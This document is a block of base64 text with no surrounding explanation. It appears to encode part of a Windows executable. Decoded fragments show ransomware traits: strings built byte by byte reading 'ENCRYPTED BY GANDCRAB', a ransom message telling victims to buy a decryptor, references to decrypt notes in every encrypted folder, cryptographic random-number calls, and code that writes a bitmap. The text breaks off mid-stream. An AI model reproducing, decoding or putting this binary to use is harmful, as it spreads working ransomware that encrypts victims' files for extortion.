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F+P7//07Ghfn+//9ExoX6/v//RcaF+/7//1LGhfz+//8gxoX9/v//U8aF/v7//1TGhf/+//9SxoUA////T8aFAf///07GhQL///9HxoUD////IMaFBP///1DGhQX///9SxoUG////T8aFB////1TGhQj///9FxoUJ////Q8aFCv///1TGhQv///9JxoUM////T8aFDf///07GhQ7///8gxoUP////QsaFEP///1nGhRH///8gxoUS////T8aFE////1XGhRT///9SxoUV////IMaFFv///1PGhRf///9PxoUY////RsaFGf///1TGhRr///9XxoUb////QcaFHP///1LGhR3///9FxoUe////LsaFH////yDGhSD///9JxoUh////TsaFIv///yDGhSP///9PxoUk////UsaFJf///0TGhSb///9FxoUn////UsaFKP///yDGhSn///9UxoUq////T8aFK////yDGhSz///9SxoUt////RcaFLv///1PGhS////9UxoUw////T8aFMf///1LGhTL///9FxoUz////IMaFNP///0nGhTX///9UxoU2////IMaFN////1nGhTj///9PxoU5////VcaFOv///yDGhTv///9NxoU8////VcaFPf///1PGhT7///9UxoU/////IMaFQP///0LGhUH///9VxoVC////WcaFQ////yDGhUT///9ExoVF////RcaFRv///0PGhUf///9SxoVI////WcaFSf///1DGhUr///9UxoVL////T8aFTP///1LGhU3///8Ai0Xo0eCLTdgryIlN2GoRjUXUUGr/jYXo/v//UP91/P8VfDIBEGtF6AOLTdgryIlN2MaFUP///0bGhVH///9vxoVS////csaFU////yDGhVT///9mxoVV////dcaFVv///3LGhVf///90xoVY////aMaFWf///2XGhVr///9yxoVb////IMaFXP///3PGhV3///90xoVe////ZcaFX////3DGhWD///9zxoVh////IMaFYv///3LGhWP///9lxoVk////YcaFZf///2TGhWb///8gxoVn////JcaFaP///3PGhWn///8txoVq////RMaFa////0XGhWz///9DxoVt////UsaFbv///1nGhW////9QxoVw////VMaFcf///y7GhXL///8lxoVz////c8aFdP///yDGhXX///90xoV2////aMaFd////2HGhXj///90xoV5////IMaFev///2nGhXv///9zxoV8////IMaFff///2zGhX7///9vxoV/////Y8ZFgGHGRYF0xkWCZcZFg2TGRYQgxkWFacZFhm7GRYcgxkWIZcZFiXbGRYplxkWLcsZFjHnGRY0gxkWOZcZFj27GRZBjxkWRcsZFknnGRZNwxkWUdMZFlWXGRZZkxkWXIMZFmGbGRZlvxkWabMZFm2TGRZxlxkWdcsZFngCLDdwSAhDoqu3//4lF5INl8ACDfeQAdEb/deT/FcgxARCDwFeLyOh07///iUXwg33wAHQqxkW8dMZFvXjGRb50xkW/AI1FvFD/deSNhVD///9Q/3Xw/xVsMgEQg8QQg33wAHUaahGNRdRQav+NhVD///9Q/3X8/xV8MgEQ6xRqEY1F1FBq//918P91/P8VfDIBEIN95AB0CItN5OgQ7///g33wAHQIi03w6ALv////tdz+////dfT/dez/dfzoffX//4PEEGoEaAAwAABoAAIAAGoA/xVkMQEQi00IiQGLRQiDOAB0O8eF2P7//wEAAACLRQj/MGgAAQAA/xU4MQEQaMCHARCLRQj/MP8VnDEBEItFCP8wi1X4i03M6EDz//9Z/7XU/v///3X8/xVoMAEQ/7Xk/v///xVkMAEQ/7XM/v///3X8/xVoMAEQ/3XM/xVkMAEQ/3X8/xVQMAEQ/3X4agD/FWQyARCLhdj+//9ei+Vdw1WL7ItNCOgh7v//XcIEAFWL7ItNCOgj7v//XcIEAMzMzMzMzMzMzMwzwA+iw8zMzMzMzMzMzMzMSIsBw2VIiwQliAEAAEiLQGhIicFIx8IEAAAASMfH6AAAAEiLBDhIKfhIOZDgAAAAdfBIi5BoAQAASImRaAEAAEgxwMNlSIsEJYgBAABIi0BwSInBSMfCBAAAAEjHx4gBAABIiwQ4SCn4SDmQgAEAAHXwSIuQCAIAAEiJkQgCAABIMcDDZUiLBCWIAQAASItAaEiJwUjHwgQAAABIx8fgAAAASIsEOEgp+Eg5kNgAAAB18EiLkGABAABIiZFgAQAASDHAw8zMzMzMzMzMzMzMzGaD+EF9AcNmg/hadgHDZoPoIMNlSIsEJWAAAADDVldIic5IiddMicH886RfXkyJwMNWSInOZq1mhcB1+UgpzkiJ8Ej/yEjR+F7DU1ZXZkKLBEHoqf///2aL2GZCiwRC6Jz///9mO8N1Dkn/yHnfuAEAAABfXlvDM8Dr+FZIic6shMB1+0iJ8EgpyEj/yF7DVldIic5IiddMicHzpkiJyF9ew0iJyItAPEgByMPMzMzMgz3ABQIQAXJfD7ZEJAiL0MHgCAvQZg9u2vIPcNsADxbbi1QkBLkPAAAAg8j/I8rT4CvR8w9vCmYP79JmD3TRZg90y2YP69FmD9fKI8h1CIPI/4PCEOvcD7zBA8JmD37aM8k6EA9FwcMzwIpEJAhTi9jB4AiLVCQI98IDAAAAdBWKCoPCATrLdFmEyXRR98IDAAAAdesL2FeLw8HjEFYL2IsKv//+/n6LwYv3M8sD8AP5g/H/g/D/M88zxoPCBIHhAAEBgXUhJQABAYF00yUAAQEBdQiB5gAAAIB1xF5fWzPAw41C/1vDi0L8OsN0NoTAdOo643QnhOR04sHoEDrDdBWEwHTXOuN0BoTkdM/rkV5fjUL/W8ONQv5eX1vDjUL9Xl9bw41C/F5fW8NVi+xWi/GLTQjGRgwAhcl1ZlfoYg0AAIv4iX4Ii1dsiRaLT2iJTgQ7FZymARB0EaFYpwEQhUdwdQfozwQAAIkGi0YEXzsFNKQBEHQVi04IoVinARCFQXB1COgxCAAAiUYEi04Ii0FwqAJ1FoPIAolBcMZGDAHrCosBiQaLQQSJRgSLxl5dwgQAVYvsg+wQ/3UMjU3w6Gf///+LTfCDeXQBfhWNRfBQagT/dQjoGAwAAIPEDIvI6xCLiZAAAACLRQgPtwxBg+EEgH38AHQHi0X4g2Bw/YvBi+Vdw1WL7IM95AUCEAB1EYtNCKEwpwEQD7cESIPgBF3DagD/dQjoh////1lZXcNVi+yDJcAFAhAAg+wcUzPbQwkdAKABEGoK6AqHAACFwA+ETAEAADPJiR3ABQIQM8APolaLNQCgARBXjX3kg84CiQeJXwSJTwiJVwyLReSLTfCJRfSB8WluZUmLRew1bnRlbIk1AKABEAvIi0XoNUdlbnULyPfZagEayVj+wWoAWQ+iiQeJXwSJTwiJVwyLTeyJTfh0Q4tF5CXwP/8PPcAGAQB0Iz1gBgIAdBw9cAYCAHQVPVAGAwB0Dj1gBgMAdAc9cAYDAHURiz3EBQIQg88BiT3EBQIQ6waLPcQFAhCDffQHfDVqBzPJjXXkWA+iiQaLxos1AKABEIlYBIlICItN+IlQDItF6KkAAgAAdA2DzwKJPcQFAhDrAjPA98EAABAAdE2DzgTHBcAFAhACAAAAiTUAoAEQ98EAAAAIdDL3wQAAABB0KoPOCMcFwAUCEAMAAACJNQCgARCoIHQTg84gxwXABQIQBQAAAIk1AKABEF9eM8Bbi+Vdw1WL7ItVCDPJU1ZBV4vB8A/BAotyeIX2dAaLwfAPwQaLsoAAAACF9nQGi8HwD8EGi3J8hfZ0BovB8A/BBouyiAAAAIX2dAaLwfAPwQZqBo1yHFuBfvgwpQEQdAyLPoX/dAaLwfAPwQeDfvQAdA2LfvyF/3QGi8HwD8EHg8YQS3XSi4KcAAAABbAAAADwD8EIQV9eW13DVYvsU1aLdQgz21eLhoQAAACFwHRmPYioARB0X4tGeIXAdFg5GHVUi4aAAAAAhcB0FzkYdRNQ6IgOAAD/toQAAADotQ4AAFlZi0Z8hcB0FzkYdRNQ6GoOAAD/toQAAADokw8AAFlZ/3Z46FUOAAD/toQAAADoSg4AAFlZi4aIAAAAhcB0RDkYdUCLhowAAAAt/gAAAFDoKQ4AAIuGlAAAAL+AAAAAK8dQ6BYOAACLhpgAAAArx1DoCA4AAP+2iAAAAOj9DQAAg8QQi4acAAAAPTilARB0GzmYsAAAAHUTUOh6DwAA/7acAAAA6NQNAABZWWoGWI2eoAAAAIlFCI1+HIF/+DClARB0HYsHhcB0FIM4AHUPUOipDQAA/zPoog0AAFlZi0UIg3/0AHQWi0f8hcB0DIM4AHUHUOiFDQAAWYtFCIPDBIPHEEiJRQh1slbobw0AAFlfXltdw1WL7ItVCIXSD4SOAAAAU1aDzv9Xi8bwD8ECi0p4hcl0BovG8A/BAYuKgAAAAIXJdAaLxvAPwQGLSnyFyXQGi8bwD8EBi4qIAAAAhcl0BovG8A/BAWoGjUocW4F5+DClARB0DIs5hf90BovG8A/BB4N59AB0DYt5/IX/dAaLxvAPwQeDwRBLddKLipwAAACBwbAAAADwD8ExTl9eW4vCXcNqDGhoiAEQ6NwRAACDZeQA6FcIAACL8IsNWKcBEIVOcHQig35sAHQc6D8IAACLcGyF9nUIaiDo+QoAAFmLxujqEQAAw2oM6K0JAABZg2X8AP81nKYBEI1GbFDoIQAAAFlZi/CJdeTHRfz+////6AUAAADrvIt15GoM6FcKAABZw1WL7FeLfQyF/3Q7i0UIhcB0NFaLMDv3dChXiTjo0Pz//1mF9nQbVui0/v//gz4AWXUPgf6gpgEQdAdW6Eb9//9Zi8de6wIzwF9dw4M90CMCEAB1Emr96E0DAABZxwXQIwIQAQAAADPAw1WL7ItFCC2kAwAAdCaD6AR0GoPoDXQOSHQEM8Bdw6H8MgEQXcOh+DIBEF3DofQyARBdw6HwMgEQXcNVi+yD7BCNTfBqAOjA+f//gyXgBQIQAItFCIP4/nUSxwXgBQIQAQAAAP8VJDIBEOssg/j9dRLHBeAFAhABAAAA/xUgMgEQ6xWD+Px1EItF8McF4AUCEAEAAACLQASAffwAdAeLTfiDYXD9i+Vdw1WL7FOLXQhWV2gBAQAAM/+NcxhXVuj9FgAAiXsEM8CJewiDxAyJuxwCAAC5AQEAAI17DKurq78QogEQK/uKBDeIBkZJdfeNixkBAAC6AAEAAIoEOYgBQUp1919eW13DVYvsgewgBQAAoVCqARAzxYlF/FNWi3UIjYXo+v//V1D/dgT/FSgyARAz278AAQAAhcAPhPAAAACLw4iEBfz+//9AO8dy9IqF7vr//42N7vr//8aF/P7//yDrHw+2UQEPtsDrDTvHcw3GhAX8/v//IEA7wnbvg8ECigGEwHXdU/92BI2F/Pr//1BXjYX8/v//UGoBU+jKFQAAU/92BI2F/P3//1dQV42F/P7//1BX/7YcAgAAU+hNFAAAg8RAjYX8/P//U/92BFdQV42F/P7//1BoAAIAAP+2HAIAAFPoJRQAAIPEJIvLD7eETfz6//+oAXQOgEwOGRCKhA38/f//6xCoAnQVgEwOGSCKhA38/P//iIQOGQEAAOsHiJwOGQEAAEE7z3LB61lqn42WGQEAAIvLWCvCiYXg+v//A9EDwomF5Pr//4PAIIP4GXcKgEwOGRCNQSDrE4O95Pr//xl3Do0EDoBIGSCNQeCIAusCiBqLheD6//+NlhkBAABBO89yuotN/F9eM81b6BUVAACL5V3DagxoiIgBEOhaDgAAM/aJdeTo1AQAAIv4iw1YpwEQhU9wdBw5d2x0F4t3aIX2dQhqIOh8BwAAWYvG6G0OAADDag3oMAYAAFmJdfyLd2iJdeQ7NTSkARB0NIX2dBiDyP/wD8EGdQ+B/hCiARB0B1bo1AgAAFmhNKQBEIlHaIs1NKQBEIl15DPAQPAPwQbHRfz+////6AUAAADrkYt15GoN6K8GAABZw2oQaKiIARDotA0AAIPP/+gwBAAAi9iJXeDoPP///4tzaP91COjS/P//WYlFCDtGBA+EaAEAAGggAgAA6LwPAABZi9iF2w+EVQEAALmIAAAAi0Xgi3Boi/vzpTP2iTNT/3UI6EEBAABZWYv4iX0Ihf8PhQcBAACLReCLSGiDyv/wD8ERdRWLSGiB+RCiARB0ClHoCwgAAFmLReCJWGgzwEDwD8EDi0Xg9kBwAg+F7wAAAPYFWKcBEAEPheIAAABqDegLBQAAWYl1/ItDBKPIBQIQi0MIo8wFAhCLgxwCAACj3AUCEIvOiU3kg/kFfRBmi0RLDGaJBE3QBQIQQevoi86JTeSB+QEBAAB9DYpEGRiIgQigARBB6+iJdeSB/gABAAB9EIqEHhkBAACIhhChARBG6+WhNKQBEIPJ//APwQh1E6E0pAEQPRCiARB0B1DoTgcAAFmJHTSkARAzwEDwD8EDx0X8/v///+gFAAAA6zGLfQhqDeg0BQAAWcPrI4P//3UegfsQogEQdAdT6BEHAABZ6OEOAADHABYAAADrAjP/i8foXgwAAMNVi+yD7CChUKoBEDPFiUX8U1b/dQiLdQzoNvv//4vYWYXbdQ5W6Jf7//9ZM8DpqQEAAFcz/4vPi8eJTeQ5mDikARAPhOgAAABBg8AwiU3kPfAAAABy5oH76P0AAA+ExgAAAIH76f0AAA+EugAAAA+3w1D/FRwyARCFwA+EqAAAAI1F6FBT/xUoMgEQhcAPhIIAAABoAQEAAI1GGFdQ6DYSAACJXgSDxAwz24m+HAIAAEM5Xeh2T4B97gCNRe50IYpIAYTJdBoPttEPtgjrBoBMDhkEQTvKdvaDwAKAOAB1341GGrn+AAAAgAgIQEl1+f92BOgi+v//g8QEiYYcAgAAiV4I6wOJfggzwI1+DKurq+m8AAAAOT3gBQIQdAtW6J76///prwAAAIPI/+mqAAAAaAEBAACNRhhXUOiZEQAAg8QMa0XkMIlF4I2ASKQBEIlF5IA4AIvIdDWKQQGEwHQrD7YRD7bA6xeB+gABAABzE4qHMKQBEAhEFhlCD7ZBATvQduWDwQKAOQB1zotF5EeDwAiJReSD/wRyuFOJXgTHRggBAAAA6G/5//+DxASJhhwCAACLReCNTgxqBo2QPKQBEF9miwKNUgJmiQGNSQJPdfFW6En6//9ZM8Bfi038XjPNW+jcEAAAi+Vdw1WL7IPsGI1N6FP/dRDoJvP//4tdCI1DAT0AAQAAdw+LReiLgJAAAAAPtwRY626Lw41N6MH4CIlFCFEPtsBQ6DoRAABZWYXAdBKLRQhqAohF+Ihd+cZF+gBZ6wozyYhd+MZF+QBBi0XoagH/cASNRfxQUY1F+FCNRehqAVDoFxAAAIPEHIXAdRA4RfR0B4tF8INgcP0zwOsUD7dF/CNFDIB99AB0B4tN8INhcP1bi+Vdw1boEgAAAIvwhfZ1CGoQ6LUCAABZi8Zew1ZX/xWkMQEQ/zUopQEQi/jo6hAAAIvwWYX2dUdovAMAAGoB6DALAACL8FlZhfZ0M1b/NSilARDo4hAAAFlZhcB0GGoAVuglAAAAWVn/FSwyARCDTgT/iQbrCVbo5QMAAFkz9lf/FRwxARBfi8Zew2oIaMiIARDo6QgAAIt1CMdGXDg3ARCDZggAM/9HiX4UiX5wakNYZomGuAAAAGaJhr4BAADHRmgQogEQg6a4AwAAAGoN6LwAAABZg2X8AItGaIvP8A/BCMdF/P7////oPgAAAGoM6JsAAABZiX38i0UMiUZshcB1CKGcpgEQiUZs/3Zs6Pbz//9Zx0X8/v///+gVAAAA6KAIAADDM/9Hi3UIag3oOgEAAFnDagzoMQEAAFnDagho8IgBEOg2CAAAvqCmARA5NZymARB0KmoM6DIAAABZg2X8AFZonKYBEOiq9v//WVmjnKYBEMdF/P7////oBgAAAOg/CAAAw2oM6N8AAABZw1WL7FaLdQiDPPVgpwEQAHUTVugdAAAAWYXAdQhqEegZAQAAWf809WCnARD/FdwwARBeXcNqCGgQiQEQ6LAHAACDPdAQAhAAdRjoBxwAAGoe6F0cAABo/wAAAOjHAAAAWVmLfQgz2zkc/WCnARB1XGoY6LYJAABZi/CF9nUP6CUKAADHAAwAAAAzwOtCagrobf///1mJXfw5HP1gpwEQdRhTaKAPAABW6CAPAACDxAyJNP1gpwEQ6wdW6BMCAABZx0X8/v///+gJAAAAM8BA6GIHAADDagroAgAAAFnDVYvsi0UI/zTFYKcBEP8V2DABEF3DVYvsUY1F/FBoEDcBEGoA/xUUMgEQhcB0F2goNwEQ/3X8/xWgMQEQhcB0Bf91CP/Qi+Vdw1WL7P91COjB////Wf91CP8VlDEBEMxVi+zoERsAAP91COhmGwAAWWj/AAAA6AEAAADMVYvsagBqAf91COg7AAAAg8QMXcNVi+yLRQxTVot1CDPbK8aDwAPB6AI5dQxXG//31yP4dhCLBoXAdAL/0IPGBEM733LwX15bXcNqHGgwiQEQ6EIGAABqCOhL/v//WYNl/ACDPTgHAhABD4TJAAAAxwVgBwIQAQAAAIpFEKJcBwIQg30MAA+FnAAAAP81zCMCEIs1NDIBEP/Wi9iJXdSF23R0/zXIIwIQ/9aL+Ild5Il94Il93IPvBIl93Dv7cldqAP8VMDIBEDkHdOo7+3JH/zf/1ovwagD/FTAyARCJB//W/zXMIwIQizU0MgEQ/9aJRdj/NcgjAhD/1otN2DlN5HUFOUXgdK6JTeSL2Yld1IlF4Iv465xo3DIBEGjMMgEQ6O/+//9ZWWjkMgEQaOAyARDo3v7//1lZx0X8/v///+ggAAAAg30QAHUpxwU4BwIQAQAAAGoI6Cr+//9Z/3UI6Gr+//+DfRAAdAhqCOgU/v//WcPoZQUAAMNVi+yDfQgAdC3/dQhqAP810BACEP8VEDIBEIXAdRhW6LIHAACL8P8VpDEBEFDotwcAAFmJBl5dw1WL7FaLdQiF9g+E6gAAAItGDDsFlKgBEHQHUOio////WYtGEDsFmKgBEHQHUOiW////WYtGFDsFnKgBEHQHUOiE////WYtGGDsFoKgBEHQHUOhy////WYtGHDsFpKgBEHQHUOhg////WYtGIDsFqKgBEHQHUOhO////WYtGJDsFrKgBEHQHUOg8////WYtGODsFwKgBEHQHUOgq////WYtGPDsFxKgBEHQHUOgY////WYtGQDsFyKgBEHQHUOgG////WYtGRDsFzKgBEHQHUOj0/v//WYtGSDsF0KgBEHQHUOji/v//WYtGTDsF1KgBEHQHUOjQ/v//WV5dw1WL7FaLdQiF9nRZiwY7BYioARB0B1Dosf7//1mLRgQ7BYyoARB0B1Don/7//1mLRgg7BZCoARB0B1Dojf7//1mLRjA7BbioARB0B1Doe/7//1mLRjQ7BbyoARB0B1Doaf7//1leXcNVi+xWi3UIhfYPhG4DAAD/dgToTv7///92COhG/v///3YM6D7+////dhDoNv7///92FOgu/v///3YY6Cb+////Nugf/v///3Yg6Bf+////diToD/7///92KOgH/v///3Ys6P/9////djDo9/3///92NOjv/f///3Yc6Of9////djjo3/3///92POjX/f//g8RA/3ZA6Mz9////dkToxP3///92SOi8/f///3ZM6LT9////dlDorP3///92VOik/f///3ZY6Jz9////dlzolP3///92YOiM/f///3Zk6IT9////dmjofP3///92bOh0/f///3Zw6Gz9////dnToZP3///92eOhc/f///3Z86FT9//+DxED/toAAAADoRv3///+2hAAAAOg7/f///7aIAAAA6DD9////towAAADoJf3///+2kAAAAOga/f///7aUAAAA6A/9////tpgAAADoBP3///+2nAAAAOj5/P///7agAAAA6O78////tqQAAADo4/z///+2qAAAAOjY/P///7a4AAAA6M38////trwAAADowvz///+2wAAAAOi3/P///7bEAAAA6Kz8////tsgAAADoofz//4PEQP+2zAAAAOiT/P///7a0AAAA6Ij8////ttQAAADoffz///+22AAAAOhy/P///7bcAAAA6Gf8////tuAAAADoXPz///+25AAAAOhR/P///7boAAAA6Eb8////ttAAAADoO/z///+27AAAAOgw/P///7bwAAAA6CX8////tvQAAADoGvz///+2+AAAAOgP/P///7b8AAAA6AT8////tgABAADo+fv///+2BAEAAOju+///g8RA/7YIAQAA6OD7////tgwBAADo1fv///+2EAEAAOjK+////7YUAQAA6L/7////thgBAADotPv///+2HAEAAOip+////7YgAQAA6J77////tiQBAADok/v///+2KAEAAOiI+////7YsAQAA6H37////tjABAADocvv///+2NAEAAOhn+////7Y4AQAA6Fz7////tjwBAADoUfv///+2QAEAAOhG+////7ZEAQAA6Dv7//+DxED/tkgBAADoLfv///+2TAEAAOgi+////7ZQAQAA6Bf7////tlQBAADoDPv///+2WAEAAOgB+////7ZcAQAA6Pb6////tmABAADo6/r//4PEHF5dw8zMzMxoQL4AEGT/NQAAAACLRCQQiWwkEI1sJBAr4FNWV6FQqgEQMUX8M8VQiWXo/3X4i0X8x0X8/v///4lF+I1F8GSjAAAAAMOLTfBkiQ0AAAAAWV9fXluL5V1Rw8zMzMzMzMxVi+yD7BhTi10MVlfGRf8Ai3sIjXMQMz1QqgEQx0X0AQAAAIsHg/j+dA2LTwQDzjMMMOgUBgAAi0cIi08MA84zDDDoBAYAAItFCPZABGYPhc8AAACJReiLRRCJReyNReiJQ/yLQwyJRfiD+P4PhO0AAACNBECNQASLTIcEjQSHixiJRfCFyXR7i9boIxgAALEBiE3/hcAPiH4AAAB+aItFCIE4Y3Nt4HUogz3EIwIQAHQfaMQjAhDotBUAAIPEBIXAdA5qAf91CP8VxCMCEIPECItVCItNDOgGGAAAi0UMi1X4OVAMdBBoUKoBEFaLyOgHGAAAi0UMiVgMiweD+P50detmik3/iV34i8OD+/4PhV7///+EyXRH6yHHRfQAAAAA6xiDewz+dDZoUKoBEFaLy7r+////6MAXAACLB4P4/nQNi08EA84zDDDo/AQAAItXCItPDAPOMwwy6OwEAACLRfRfXluL5V3Di08EA84zDDDo1QQAAItHCItPDAPOMwww6MUEAACLTfCL1otJCOg2FwAAzFWL7FZXM/ZqAP91DP91COj8FwAAi/iDxAyF/3UlOQV0BwIQdh1W6CsGAACBxugDAABZOzV0BwIQdgODzv+D/v91xYvHX15dw1WL7FNWV4s9dAcCEDP2/3UI6CAXAACL2FmF23Ujhf90H1bo5wUAAIs9dAcCEIHG6AMAAFk793YDg87/g/7/dc5fXovDW13D6BT0//+FwHUGuEyqARDDg8AMw1WL7Fbo5P///4tNCFGJCOggAAAAWYvw6AUAAACJMF5dw+jg8///hcB1BrhIqgEQw4PACMNVi+yLTQgzwDsMxeCoARB0J0CD+C1y8Y1B7YP4EXcFag1YXcONgUT///9qDlk7yBvAI8GDwAhdw4sExeSoARBdw1WL7FFRoVCqARAzxYlF/FNWi3UYV4X2fiGLRRSLzkmAOAB0CECFyXX1g8n/i8YrwUg7xo1wAXwCi/CLTSQz/4XJdQ2LRQiLAItABIvIiUUkM8A5RShqAGoAVv91FA+VwI0ExQEAAABQUf8VwDEBEIvIiU34hcl1BzPA6XEBAAB+V2rgM9JY9/GD+AJySwPJjUEIO8F2P4tF+I0ERQgAAAA9AAQAAHcT6MkWAACL3IXbdB7HA8zMAADrE1DopxUAAIvYWYXbdAnHA93dAACDwwiLTfjrBYtN+DPbhdt0mlFTVv91FGoB/3Uk/xXAMQEQhcAPhPAAAACLdfhqAGoAVlP/dRD/dQzolQ8AAIv4g8QYhf8PhM8AAAD3RRAABAAAdCyLTSCFyQ+EuwAAADv5D4+zAAAAUf91HFZT/3UQ/3UM6FsPAACDxBjpmgAAAIX/fk9q4DPSWPf3g/gCckONDD+NQQg7wXY5jQR9CAAAAD0ABAAAdxPo+xUAAIv0hfZ0Z8cGzMwAAOsTUOjZFAAAi/BZhfZ0UscG3d0AAIPGCOsCM/aF9nRBi0X4V1ZQU/91EP91DOjoDgAAg8QYhcB0ITPAUFA5RSB1BFBQ6wb/dSD/dRxXVlD/dST/FfAwARCL+FboZAAAAFlT6F0AAABZi8eNZexfXluLTfwzzeigAQAAi+Vdw1WL7IPsEP91CI1N8Ojr4////3UojUXw/3Uk/3Ug/3Uc/3UY/3UU/3UQ/3UMUOjK/f//g8QkgH38AHQHi034g2Fw/YvlXcNVi+yLRQiFwHQSg+gIgTjd3QAAdQdQ6HH1//9ZXcNVi+xRoVCqARAzxYlF/ItNHFNWVzP/hcl1DYtFCIsAi0AEi8iJRRxXM8A5RSBX/3UUD5XA/3UQjQTFAQAAAFBR/xXAMQEQi9iF23UHM8DpkQAAAH5Lgfvw//9/d0